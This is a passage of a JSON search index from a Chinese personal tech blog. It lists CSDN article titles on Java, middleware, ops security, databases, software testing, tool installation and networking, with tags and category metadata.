内存泄漏和内存溢出内存泄漏和内存溢出_weixin_42665577的博客-CSDN博客_内存泄漏和内存溢出 servletservlet到底是什么_森林体系-CSDN博客_servlet是什么 SSM框架原理,作用及使用方法SSM框架原理,作用及使用方法_bieleyang的博客-CSDN博客_ssm框架 MVC模式介绍MVC模式介绍_liitdar的博客-CSDN博客_mvc模式 Web发展简史Web发展简史(（webapp+Java原生）移动端开发 )+web网站) 耦合与内聚耦合与内聚_weixin_43834780的博客-CSDN博客_耦合与内聚 Jvm垃圾回收器（基础篇）Jvm垃圾回收器（基础篇） Jvm垃圾回收器（算法篇）Jvm垃圾回收器（算法篇） Jvm垃圾回收器（终结篇）Jvm垃圾回收器（终结篇） Jvm运行时数据区Jvm运行时数据区 java中几个主流的数据库连接池java中几个主流的数据库连接池_阿甘的博客-CSDN博客_java 数据库连接池 Hibernate入门第一讲——Hibernate框架的快速入门Hibernate入门第一讲–Hibernate框架的快速入门_李阿昀的博客-CSDN博客_hibernate","categories":[{"name":"链接汇总","slug":"链接汇总","permalink":"https://www.zhengjunyao.top/categories/%E9%93%BE%E6%8E%A5%E6%B1%87%E6%80%BB/"}],"tags":[{"name":"java","slug":"java","permalink":"https://www.zhengjunyao.top/tags/java/"}]},{"title":"中间件速记版","slug":"中间件 ","date":"2021-12-29T14:38:25.396Z","updated":"2022-06-06T09:34:10.768Z","comments":true,"path":"2021/12/29/中间件 /","link":"","permalink":"https://www.zhengjunyao.top/2021/12/29/%E4%B8%AD%E9%97%B4%E4%BB%B6%20/","excerpt":"","text":"中间件浅谈 C/S 和 B/S 架构浅谈 C/S 和 B/S 架构_秋叶原 &amp;&amp; Mike || 麦克-CSDN博客_b/s架构 消息队列面试官问我：什么是消息队列？什么场景需要他？用了会出现什么问题？_敖丙-CSDN博客_什么场景需要队列 架构设计 | 单点登录（SSO），从原理到实现架构设计 | 单点登录（SSO），从原理到实现_挖坑埋你-CSDN博客 jenkins教程jenkins教程_翻身咸鱼的博客-CSDN博客 k8s常用操作命令k8s常用操作命令_xiaofang2015的博客-CSDN博客_k8s常用命令 Docker的基本命令Docker的基本命令_苍穹尘的博客-CSDN博客_docker 命令 MVVM框架对比MVVM框架对比_前端布道者-CSDN博客_js mvvm框架 NginxNginx是什么 ? 能干嘛 ？_方志朋的专栏-CSDN博客 Jenkins是什么：持续集成（CI）流程、特点、应用场景Jenkins是什么：持续集成（CI）流程、特点、应用场景_琦彦-CSDN博客_jenkins的优点 ZooKeeperZooKeeper是什么_李平安-CSDN博客_zookeeper是什么 ZooKeeper概念详解，最全整理_春风化雨-CSDN博客_zookeeper docker这可能是最为详细的Docker入门吐血总结_彪锅锅来啦-CSDN博客_docker Nginx工作原理和优化总结Nginx工作原理和优化总结。_黄规速博客:学如逆水行舟，不进则退-CSDN博客_nginx 原理 高并发系统建设经验总结高并发系统建设经验总结_腾讯技术工程-CSDN博客 解Bug之路-Nginx 502 Bad Gateway解Bug之路-Nginx 502 Bad Gateway Keepalived 服务器安装与配置Keepalived 服务器安装与配置_挖坑埋你-CSDN博客_keepalived安装与配置 Redis为什么是单线程、及高并发快的大原因详解Redis为什么是单线程、及高并发快的大原因详解_湖人*总冠军-CSDN博客_redis为什么是单线程 k8s之StatefulSet详解k8s之StatefulSet详解_最美dee时光的博客-CSDN博客 kafka简介Kafka学习之路 （一）Kafka的简介 Nacos详细教程Nacos详细教程_Top_L398的博客-CSDN博客_nacos教程 Nacos（一）：Nacos介绍 ApolloApollo学习（一）Apollo初学入门_千年似流水的博客-CSDN博客_apollo是什么 Apollo 入门（超级详细）_LXMuuuu的博客-CSDN博客_apollo 入门 Eureka工作原理Eureka工作原理_技术无止境-CSDN博客_eureka 架构-三地五中心程序要一定要明白的架构-三地五中心（2） 消息队列使用的四种场景介绍消息队列使用的四种场景介绍 消息中间件MQ与RabbitMQ面试题消息中间件MQ与RabbitMQ面试题（2020最新版）_ThinkWon的博客-CSDN博客_rabbitmq面试题 解决RabbitMQ消息丢失问题和保证消息可靠性解决RabbitMQ消息丢失问题和保证消息可靠性（一）_枕邊書的博客-CSDN博客_rabbitmq消息丢失 消息中间件如何解决消息丢失问题 消息中间件如何确保数据不丢失？消息中间件如何确保数据不丢失？_yygEwing的博客-CSDN博客","categories":[{"name":"链接汇总","slug":"链接汇总","permalink":"https://www.zhengjunyao.top/categories/%E9%93%BE%E6%8E%A5%E6%B1%87%E6%80%BB/"}],"tags":[{"name":"中间件","slug":"中间件","permalink":"https://www.zhengjunyao.top/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"}]},{"title":"运维安全速记版","slug":"运维安全","date":"2021-12-29T14:38:25.300Z","updated":"2022-06-15T07:07:50.063Z","comments":true,"path":"2021/12/29/运维安全/","link":"","permalink":"https://www.zhengjunyao.top/2021/12/29/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/","excerpt":"","text":"windows-运维-05 初识PowerShellwindows-运维-05 初识PowerShell_IT@feng的博客-CSDN博客 💡 netstat 网络端口状态，route print 查看本机路由信息，cmd /c help 查看cmd命令，Start-Process powershell -Verb runAs 切换管理员 CMD和win powershell的区别浅谈CMD和win powershell的区别_Diligence is the mother of success.-CSDN博客_cmd和powershell区别 服务器RAID配置全程服务器RAID配置全程_恒信的博客-CSDN博客_服务器做raid 弱口令DDoS的攻击原理与防御方法","categories":[{"name":"链接汇总","slug":"链接汇总","permalink":"https://www.zhengjunyao.top/categories/%E9%93%BE%E6%8E%A5%E6%B1%87%E6%80%BB/"}],"tags":[{"name":"运维安全","slug":"运维安全","permalink":"https://www.zhengjunyao.top/tags/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/"}]},{"title":"数据库速记版","slug":"数据库","date":"2021-12-29T14:38:25.262Z","updated":"2022-06-06T09:33:49.954Z","comments":true,"path":"2021/12/29/数据库/","link":"","permalink":"https://www.zhengjunyao.top/2021/12/29/%E6%95%B0%E6%8D%AE%E5%BA%93/","excerpt":"","text":"数据库SQL语句的左外连接 , 右外连接 , 内连接彷徨 | SQL语句的左外连接 , 右外连接 , 内连接_彷徨的博客-CSDN博客_左外连接的sql语句 SQL中的连接查询与嵌套查询SQL中的连接查询与嵌套查询_myblog-CSDN博客_sql嵌套查询 SQL查询语句大全SQL查询语句大全(个人总结) SQL中group by详解关于group by的用法 原理_迎着晨曦，Keep Going-CSDN博客 MySql关键字汇总MySql关键字汇总_yang–x的博客-CSDN博客 SQL最全基础教程SQL最全基础教程(有本事别看啊!) 数据库的五种索引类型数据库的五种索引类型_gaotiedun1的博客-CSDN博客_索引类型 Sql Server 编译、重编译与执行计划重用原理Sql Server 编译、重编译与执行计划重用原理_babauyang的专栏-CSDN博客 SQL参数化查询SQL参数化查询_zyw_anquan的专栏-CSDN博客_sql参数化查询 数据库中的锁 数据库视图是什么，和表有什么区别和联系","categories":[{"name":"链接汇总","slug":"链接汇总","permalink":"https://www.zhengjunyao.top/categories/%E9%93%BE%E6%8E%A5%E6%B1%87%E6%80%BB/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://www.zhengjunyao.top/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"软件测试速记版","slug":"软件测试 ","date":"2021-12-29T14:38:25.226Z","updated":"2022-06-06T09:33:27.159Z","comments":true,"path":"2021/12/29/软件测试 /","link":"","permalink":"https://www.zhengjunyao.top/2021/12/29/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%20/","excerpt":"","text":"软件测试JSON进行数据传输使用JSON进行数据传输的总结_bieleyang的博客-CSDN博客 测试用例的重要级别如何划分？测试用例的重要级别如何划分？_Jack_Chen3的专栏-CSDN博客_测试用例等级划分 Loadrunner 详细实例教程Loadrunner 详细实例教程_u012842547的博客-CSDN博客_loadrunner 软件测试面试题软件测试面试题（面试前准备篇）_彩虹的博客-CSDN博客 iOS APP功能测试iOS APP功能测试（个人总结完整版）_酷酷木女侠-CSDN博客_ios测试 jmeter对聚合报告，查看观察树，以及图形结果的分析jmeter对聚合报告，查看观察树，以及图形结果的分析_cherry_cindy的博客-CSDN博客 jmeter主要参数设置和聚合报告分析_u013434475的博客-CSDN博客_jmeter聚合报告分析 API接口测试及常用de接口测试工具API接口测试及常用de接口测试工具_Enweitech Software Works-CSDN博客_api接口测试工具 QPS、TPS、并发用户数、吞吐量QPS、TPS、并发用户数、吞吐量之间有什么联系，存在什么关系？_李文良的博客-CSDN博客 Selenium-IDE脚本录制Selenium-IDE脚本录制,selenium-side-runner自动化测试教程_全栈工程师开发手册（原创）(腾讯内推)-CSDN博客_selenium 录制 Python必会的单元测试框架 —— unittestPython必会的单元测试框架 – unittest_灰蓝-CSDN博客_unittest测试框架 Fiddler实现手机抓包Fiddler实现手机抓包–小白入门_做一个不动声色的大人-CSDN博客_手机抓包 Postman系列之Tests断言Postman系列之Tests断言_CoCo小锦鲤的博客-CSDN博客 基于Python的HTTP接口自动化测试框架实现基于Python的HTTP接口自动化测试框架实现_张元礼-门道科技创始人|16年IT从业经验（抖音号：mtesting）-CSDN博客_python接口自动化测试框架 弱网测试弱网测试_小七的博客-CSDN博客_弱网测试有哪些参数 什么是弱网测试?为什么要进行弱网测试?怎么进行弱网测试？_qq284489030的博客-CSDN博客 软件测试面试常见问题软件测试常见问题 1 软件测试过程的度量软件测试过程的度量 Postman的使用及常见问题解决(超简单)Postman的使用及常见问题解决(超简单) 自动化接口测试之Postman（一篇搞定）自动化接口测试之Postman（一篇搞定）_wiky的专栏-CSDN博客_postman自动化测试 Postman接口测试自动化介绍_踏雪飞狐的博客-CSDN博客_postman接口测试 功能测试注意点内幕：阿里老测试员告诉你，新人如何做好功能测试，学会这几项 HTTP协议抓包分析HTTP协议抓包分析_suliangkuanjiayou的博客-CSDN博客_http抓包 测试必会的常用linux命令测试必会的常用linux命令","categories":[{"name":"链接汇总","slug":"链接汇总","permalink":"https://www.zhengjunyao.top/categories/%E9%93%BE%E6%8E%A5%E6%B1%87%E6%80%BB/"}],"tags":[{"name":"软件测试","slug":"软件测试","permalink":"https://www.zhengjunyao.top/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"}]},{"title":"安装配置速记版","slug":"安装配置 ","date":"2021-12-29T14:38:05.898Z","updated":"2022-06-06T09:33:02.521Z","comments":true,"path":"2021/12/29/安装配置 /","link":"","permalink":"https://www.zhengjunyao.top/2021/12/29/%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%20/","excerpt":"","text":"安装配置Windows下2.21.0版Git及TortoiseGit安装与配置Git教程一：Windows下2.21.0版Git及TortoiseGit安装与配置_梦想之始-CSDN博客_tortoisegit安装教程 homebrew安装失败在Mac上面安装HomeBrew失败的解决方案：修改hosts文件_偕臧-CSDN博客 443 Operation timed out - github 解决方案_coderx_zz的博客-程序员宝宝 - 程序员宝宝 安装node时提示不能用homebrew作为roothomebrew 无法安装，提示不能在根目录下使用 [Node.js]在mac上安装node.js[Node.js]在mac上安装node.js MAC上Git安装与GitHub基本使用MAC上Git安装与GitHub基本使用 MAC下使用GitHub+hexo搭建个人博客Mac下使用GitHub+Hexo搭建个人博客 hexo搭建个人博客_hexo搭建个人博客-CSDN博客 手把手教你使用hexo搭建属于你的个人博客_catalinaLi的博客-CSDN博客_用hexo创建博客","categories":[{"name":"链接汇总","slug":"链接汇总","permalink":"https://www.zhengjunyao.top/categories/%E9%93%BE%E6%8E%A5%E6%B1%87%E6%80%BB/"}],"tags":[{"name":"软件安装","slug":"软件安装","permalink":"https://www.zhengjunyao.top/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/"}]},{"title":"计算机网络速记","slug":"计算机网络","date":"2021-12-29T00:02:50.000Z","updated":"2022-06-06T09:32:46.062Z","comments":true,"path":"2021/12/29/计算机网络/","link":"","permalink":"https://www.zhengjunyao.top/2021/12/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/","excerpt":"","text":"计算机网络linux重定向linux 输入、输出重定向的概念和用法详解（Day01）_world_zheng的博客-CSDN博客_什么是输入输出重定向?举例说明之 数字证书解释What is a Digital Signature? Ping原理ping 原理_微微一笑-CSDN博客_ping的原理 WebSocket介绍和Socket的区别WebSocket介绍和Socket的区别_王卫东 博客-CSDN博客 http,websocket和socket详解_小毕先生的博客-CSDN博客 ICMP协议的功能14、ICMP协议的主要功能_ 谢语天-CSDN博客 ICMP协议_binger-csdn的博客-CSDN博客_icmp协议 路由器和交换机的区别路由器与交换机的区别与联系_WhataNerd的博客-CSDN博客_交换机和路由器的区别 xss攻击web安全之XSS攻击原理及防范 - 龙恩0707 - 博客园 TCP/IP协议TCP/IP协议详解_王佳斌-CSDN博客_tcp/ip协议 MAC地址和IP地址MAC地址和IP地址的区别与联系（计算机网络篇）_yang_best的专栏-CSDN博客_mac地址和ip地址的区别和联系 网络拓扑结构网络拓扑结构_wdirdo的博客-CSDN博客_网络拓扑结构 OSI七层模型OSI七层模型基础知识及各层常见应用_WANGZHEN-CSDN博客_osi七层模型 交换机的工作原理交换机的工作原理_老王不让用的博客-CSDN博客_交换机的工作原理是什么 HTTPS工作原理深入浅出HTTPS工作原理_XINJing的专栏-CSDN博客_https原理 NAT详解NAT NAT的四种类型_eydwyz的专栏-CSDN博客_nat类型 TCP协议中三次握手中的大写ACK和小写ack number的区别关于TCP协议中三次握手中的大写ACK和小写ack number的区别_踟蹰千年的博客-CSDN博客_ack和ack TCP 和 UDP 的区别TCP 和 UDP 的区别_zhang6223284的博客-CSDN博客_tcp和udp的区别 tcp十一种状态及问题处理方法tcp十一种状态及问题处理方法_不再疯要傻-CSDN博客_syn_sent是什么状态 网关及网关作用什么是网关及网关作用_bestcleaner-CSDN博客_网关作用 FTP文件传输协议FTP文件传输协议_bear_huangzhen的专栏-CSDN博客_ftp协议 sftp和ssh协议sftp和ssh协议_笑strive-CSDN博客_sftp协议 网络拓扑核心层汇聚网络拓扑中，什么是核心层？什么是汇聚层？_mogexiuluo的博客-CSDN博客_网络汇聚层 谁能告诉我什么是承载网，核心网和接入网? HTTP协议的 无连接，无状态如何理解HTTP协议的 &#34;无连接，无状态&#34; 特点？_秋叶原 &amp;&amp; Mike || 麦克-CSDN博客 网络管理之基础知识详解 Http请求的过程与原理HTTP协议请求响应过程和HTTPS工作原理 应用环境下的TIME_WAIT和CLOSE_WAIT再谈应用环境下的TIME_WAIT和CLOSE_WAIT_C My Life-CSDN博客_time_wait 修复漏洞：启用不安全的HTTP方法【AppScan深入浅出】修复漏洞：启用不安全的HTTP方法 （中） 启用了不安全的HTTP方法 网络存储文件共享之WebDAV网络存储文件共享之WebDAV_攻城狮·正-CSDN博客 https 单向认证和双向认证原理详细理解 https 单向认证和双向认证原理_成熟的小孩的博客-CSDN博客_https双向认证 DNS原理及其解析过程DNS原理及其解析过程 为什么域名根服务器只能有13台呢？ XSS跨站脚本攻击XSS跨站脚本攻击 Web安全之CSRF攻击Web安全之CSRF攻击 sql注入SQL注入攻防入门详解 sql注入基础原理（超详细）_会哭的雨@的博客-CSDN博客_sql注入基础 TCP粘包什么是TCP粘包？怎么解决这个问题_渔溪大王的博客-CSDN博客_tcp粘包 使用 libevent 和 libev 提高网络应用性能——I/O模型演进变化史使用 libevent 和 libev 提高网络应用性能–I/O模型演进变化史_黄规速博客:学如逆水行舟，不进则退-CSDN博客 防火墙和iptables防火墙和iptables HTTP的长连接和短连接HTTP的长连接（持久连接）和短连接_yinni11的博客-CSDN博客_持久连接 http的长连接和短连接（史上最通俗！）_maquealone的博客-CSDN博客_长连接短连接 图解|原来这就是网络图解 | 原来这就是网络 一篇文章帮你彻底搞清楚“I/O多路复用”和“异步I/O”的前世今生【面试】一篇文章帮你彻底搞清楚&#34;I/O多路复用&#34;和&#34;异步I/O&#34;的前世今生 网关【IT互联网系列】什么是网关？网关的作用是什么？看完不懂，你捶我_Yangy的博客-CSDN博客_互联网网关的作用是什么 ICMP数据包-实战分析 ICMP协议详解ICMP协议详解_honeyJ-CSDN博客_icmp协议 ipv4与ipv6的区别ipv4与ipv6的区别_lmm0513的博客-CSDN博客_ipv4和ipv6的区别 端口号和进程的关系【计算机网络】端口和进程的区别_YASHUPIAN的博客-CSDN博客_端口和进程 寄存器什么是寄存器 寄存器（cpu工作原理）_u012493828的专栏-CSDN博客_cpu寄存器","categories":[{"name":"链接汇总","slug":"链接汇总","permalink":"https://www.zhengjunyao.top/categories/%E9%93%BE%E6%8E%A5%E6%B1%87%E6%80%BB/"}],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://www.zhengjunyao.top/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]}],"categories":[{"name":"工作流","slug":"工作流","permalink":"https://www.zhengjunyao.top/categories/%E5%B7%A5%E4%BD%9C%E6%B5%81/"},{"name":"效率工具","slug":"效率工具","permalink":"https://www.zhengjunyao.top/categories/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/"},{"name":"软件测试","slug":"软件测试","permalink":"https://www.zhengjunyao.top/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"},{"name":"运维","slug":"运维","permalink":"https://www.zhengjunyao.top/categories/%E8%BF%90%E7%BB%B4/"},{"name":"资源","slug":"资源","permalink":"https://www.zhengjunyao.top/categories/%E8%B5%84%E6%BA%90/"},{"name":"工具使用","slug":"工具使用","permalink":"https://www.zhengjunyao.top/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"name":"链接汇总","slug":"链接汇总","permalink":"https://www.zhengjunyao.top/categories/%E9%93%BE%E6%8E%A5%E6%B1%87%E6%80%BB/"}],"tags":[{"name":"效率工具","slug":"效率工具","permalink":"https://www.zhengjunyao.top/tags/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/"},{"name":"notion","slug":"notion","permalink":"https://www.zhengjunyao.top/tags/notion/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.zhengjunyao.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"Docker","slug":"Docker","permalink":"https://www.zhengjunyao.top/tags/Docker/"},{"name":"selenium","slug":"selenium","permalink":"https://www.zhengjunyao.top/tags/selenium/"},{"name":"学习资源","slug":"学习资源","permalink":"https://www.zhengjunyao.top/tags/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/"},{"name":"github","slug":"github","permalink":"https://www.zhengjunyao.top/tags/github/"},{"name":"python","slug":"python","permalink":"https://www.zhengjunyao.top/tags/python/"},{"name":"linux","slug":"linux","permalink":"https://www.zhengjunyao.top/tags/linux/"},{"name":"java","slug":"java","permalink":"https://www.zhengjunyao.top/tags/java/"},{"name":"中间件","slug":"中间件","permalink":"https://www.zhengjunyao.top/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"},{"name":"运维安全","slug":"运维安全","permalink":"https://www.zhengjunyao.top/tags/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/"},{"name":"数据库","slug":"数据库","permalink":"https://www.zhengjunyao.top/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"软件测试","slug":"软件测试","permalink":"https://www.zhengjunyao.top/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"},{"name":"软件安装","slug":"软件安装","permalink":"https://www.zhengjunyao.top/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://www.zhengjunyao.top/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]}